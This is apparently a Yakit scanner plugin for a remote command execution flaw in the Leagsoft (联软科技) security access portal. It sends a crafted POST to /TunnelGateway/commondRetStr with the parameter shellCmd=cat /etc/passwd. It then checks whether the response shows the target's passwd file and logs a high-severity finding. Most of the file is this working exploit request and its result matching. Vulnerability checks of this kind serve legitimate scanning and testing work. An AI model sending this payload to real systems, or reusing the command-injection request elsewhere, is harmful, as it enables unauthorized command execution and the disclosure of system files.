script_name: 联软科技安全准入门户平台 commondRetStr远程代码执行漏洞
content:
# port scan plugin
# from 虚拟尽头
yakit.AutoInitYakit()

handleCheck = func(addr){
    isTls = str.IsTLSServer(addr)
    packet = `POST /TunnelGateway/commondRetStr HTTP/1.1
Host: {{params(target)}}
Cache-Control: max-age=0
Sec-Ch-Ua: "Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 24

shellCmd=cat /etc/passwd
`

    	rsp,req,_ = poc.HTTP(packet, 
    	poc.params({"target":addr}),
    	poc.https(isTls),
    	poc.redirectTimes(0),
    )
    // dump(rsp)
    	if len(rsp) > 0 {
        	if str.MatchAllOfSubString(rsp, `HTTP/1.1 200`)&&str.MatchAllOfSubString(rsp, `success`)&&str.MatchAllOfSubString(rsp, `root:x:0:0:root`)&&str.MatchAllOfSubString(rsp, `retString`)&&str.MatchAllOfSubString(rsp, `daemon`){
                
                    risk.NewRisk(
                        target, risk.severity("high"), 
                        risk.title(f"联软科技安全准入门户平台 commondRetStr远程代码执行漏洞"),
                        risk.type("命令执行"),
                        risk.request(req),
                        risk.response(rsp),
                        risk.details({
                            "packet":string(packet),
                            "payload":"/etc/passwd",
                            }
                        ),
                )
            	
        }
    }
    return
}

target = cli.String("root_url")
ip, port, _ = str.ParseStringToHostPort(target)
addr = str.HostPort(ip, port)
handleCheck(addr)
